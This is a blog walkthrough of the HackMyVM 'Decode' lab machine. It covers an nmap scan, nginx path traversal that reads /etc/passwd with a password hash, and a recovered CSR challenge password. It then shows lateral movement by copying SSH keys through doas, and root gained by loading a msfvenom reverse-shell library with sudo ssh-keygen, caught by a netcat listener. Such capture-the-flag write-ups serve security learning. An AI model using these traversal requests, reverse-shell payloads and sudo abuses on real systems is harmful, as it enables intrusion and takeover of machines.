---
layout: post
title: "HackMyVM - Decode"
date: 2022-05-07 22:10:00 +0100
categories: hmv
---

Creator: [avijneyam](https://hackmyvm.eu/profile/?user=avijneyam)
Level: Easy
Release Date: 2022-04-28

## Scan Services

```nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 10:54 WEST
Nmap scan report for 192.168.1.18
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
| http-robots.txt: 1 disallowed entry 
|_/encode/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```

## Enumeration

```bash
curl http://192.168.1.18/robots.txt
User-agent: decode
Disallow: /encode/

User-agent: *
Allow: /
Allow: /decode
Allow: ../
Allow: /index
Allow: .shtml
Allow: /lfi../
Allow: /etc/
Allow: passwd
Allow: /usr/
Allow: share
Allow: /var/www/html/
Allow: /cgi-bin/
Allow: decode.sh

curl -I http://192.168.1.18/decode 
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Sat, 07 May 2022 10:23:39 GMT
Content-Type: text/html
Location: http://192.168.1.18/decode/
Connection: keep-alive

curl http://192.168.1.18/decode/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
steve:$y$j9T$gbohHcbFkUEmW0d3ZeUx40$Xa/DJJdFujIezo5lg9PDmswZH32cG6kAWP.crcqrqo/:1001:1001::/usr/share:/bin/bash
decoder:x:1002:1002::/home/decoder:/usr/sbin/nologin
ajneya:x:1003:1003::/home/ajneya:/bin/bash

curl http://192.168.1.18/cgi-bin/decode.sh 
DATE: Sat 07 May 2022 06:55:39 AM EDT

PWD: /var/www/html/
CMD: ls -la

total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 15 14:24 .
drwxr-xr-x 3 root     root     4096 Apr 11 14:30 ..
-rw-r--r-- 1 root     root      240 Apr 15 14:24 1
-rw-r--r-- 1 root     root       22 Apr 14 05:14 file.php
-rw-r--r-- 1 root     root      612 Apr 13 14:01 index.html
-rw-r--r-- 1 root     root      240 Apr 15 14:24 robots.txt

```

### GoBuster

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.1.18/decode../ -q

/bin                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../bin/]
/boot                 (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../boot/]
/dev                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../dev/] 
/etc                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../etc/] 
/home                 (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../home/]
/lib                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../lib/] 
/lost+found           (Status: 403) [Size: 153]                                         
/media                (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../media/]
/opt                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../opt/]  
/proc                 (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../proc/] 
/root                 (Status: 403) [Size: 153]                                          
/run                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../run/]  
/sbin                 (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../sbin/] 
/srv                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../srv/]  
/sys                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../sys/]  
/tmp                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../tmp/]  
/usr                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../usr/]  
/var                  (Status: 301) [Size: 169] [--> http://192.168.1.18/decode../var/]  
```

### Enumerate Users

```bash
curl http://192.168.1.18/decode../etc/passwd                                                         

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
steve:$y$j9T$gbohHcbFkUEmW0d3ZeUx40$Xa/DJJdFujIezo5lg9PDmswZH32cG6kAWP.crcqrqo/:1001:1001::/usr/share:/bin/bash
decoder:x:1002:1002::/home/decoder:/usr/sbin/nologin
ajneya:x:1003:1003::/home/ajneya:/bin/bash
```

```bash
curl http://192.168.1.18/decode../usr/share/.bash_history  
rm -rf /usr/share/ssl-cert/decode.csr

curl http://192.168.1.18/decode../usr/share/ssl-cert/decode.csr
-----BEGIN CERTIFICATE REQUEST-----
MIIDAzCCAesCAQAwSDERMA8GA1UEAwwISGFja015Vk0xDzANBgNVBAgMBmRlY29k
ZTEPMA0GA1UEBwwGZGVjb2RlMREwDwYDVQQKDAhIYWNrTXlWTTCCASIwDQYJKoZI
hvcNAQEBBQADggEPADCCAQoCggEBANnSG9vEEGPRgDA/cT6NT3sMKsi6dLhKwRgy
PcRpRt1TO63kpY2PxNSgOPpydjUm34nwghy5lPL4+GBXoNOHMhQI1hUVqZXmuFB8
+DCETqXNfV5JnTRMG5tr2m4vV1HNTH+/GUueBm5R/ERu69n2xMADs4nEL3iRjOO/
19sYZIj+ZDaN3MouyqrprWy9PBwKf2VTy4prJh6nTEVSV8oRRtd+nOxfEG6890+P
lF6s0XDpv8V001aiJWSceYPIikvKXaVy45h3JoYzWsQzt3b1R22DuPjAOQ3AvZbp
V68lkF+S1rIa7gsb8oeZI16yPz+GEPVvXGzLyIYhDixdxOCFZaECAwEAAaB2MBkG
CSqGSIb3DQEJBzEMDAppNG1EM2MwZDNyMFkGCSqGSIb3DQEJDjFMMEowDgYDVR0P
AQH/BAQDAgWgMCAGA1UdJQEB/wQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAWBgNV
HREEDzANggtoYWNrbXl2bS5ldTANBgkqhkiG9w0BAQsFAAOCAQEAO73W3pTMqSm2
A37vepuR4F3ycnFKdFyRhk1rtO1LE9OWOI3bQ7kW0wIFuRaqFONsG/mvGFgEfRR8
xpgSYmnzWJQ0nTOtGi6d7F0dFFmYIXe75+6QYM2ZwAYf3lW+HRKLXhh5FMeoXJHo
eU64o9tFdhWxcB1OLAGEG9MI6AhN62ZTrKwMq13/PIteoPAEnlVgBidxQxUVHQfO
EwMP38jzm+HESbZsNVjX4RQjtvBUAKQUTBRYuS02QqqC5ajHz0RWaGgrGIyKrip5
yRjgsjxtmadaetxSasIg5tsjSFGyyVVPsdY4umAUUm+dSobruxcyXuxXIgn27Z7M
h97It2ELpw==
-----END CERTIFICATE REQUEST-----
```

### [CSR decode](https://certlogik.com/decoder/)

```
       :       }
379 118:     [0] {
381  25:       SEQUENCE {
383   9:         OBJECT IDENTIFIER challengePassword (1 2 840 113549 1 9 7)
394  12:         SET {
396  10:           UTF8String 'i4mD3c0d3r'
       :           }
       :         }
```

## Lateral movement (steve>ajneya)


```bash
steve@decode:/home/steve/.ssh$ sudo -l
Matching Defaults entries for steve on decode:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steve may run the following commands on decode:
    (decoder) NOPASSWD: /usr/bin/openssl enc *, /usr/bin/tee
```

### SUID

```bash
steve@decode:/tmp$ find / -perm -u=s 2>/dev/null

/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/doas
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

steve@decode:/tmp$ doas 
usage: doas [-Lns] [-C config] [-u user] command [args]                                                                                                                
steve@decode:/tmp$ cat /etc/doas.conf                                                                                                                                  
permit nopass steve as ajneya cmd cp                                                                                                                                   
steve@decode:/tmp$                
```

### Authorized_keys

```bash
steve@decode:/tmp$ mkdir .ssh
steve@decode:/tmp$ cd .ssh/
steve@decode:/tmp/.ssh$ nano authorized_keys
steve@decode:/tmp/.ssh$ cd ..
steve@decode:/tmp$ chmod -R 777 .ssh/
steve@decode:/tmp$ doas -u ajneya cp -r .ssh/ /home/ajneya/
```

```bash
ssh ajneya@192.168.1.18
ajneya@decode:~$ ls
user.txt
```

## ROOT - [ssh-keygen](https://gtfobins.github.io/gtfobins/ssh-keygen/#sudo)

```bash
ajneya@decode:~$ sudo -l
Matching Defaults entries for ajneya on decode:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ajneya may run the following commands on decode:
    (root) NOPASSWD: /usr/bin/ssh-keygen * /opt/*
```

### Generate library  with MSFVenon

```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.6 LPORT=9001 -o lib.so -f elf-so

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes                                                                                                                                   
Saved as: lib.so                                                                                                                                                       

$ scp lib.so ajneya@192.168.1.18:/tmp                        
```

### Copy lib.so to /opt/decode (steve)

```bash
steve@decode:/tmp$ cat /tmp/lib.so | sudo -u decoder tee /opt/decode/lib.so
```

```bash
ajneya@decode:/tmp$ sudo ssh-keygen -D /opt/decode/lib.so                                                                                                              
```

```bash
$ nc -lvnp 9001                
listening on [any] 9001 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.18] 58244
id
uid=0(root) gid=0(root) groups=0(root)
```

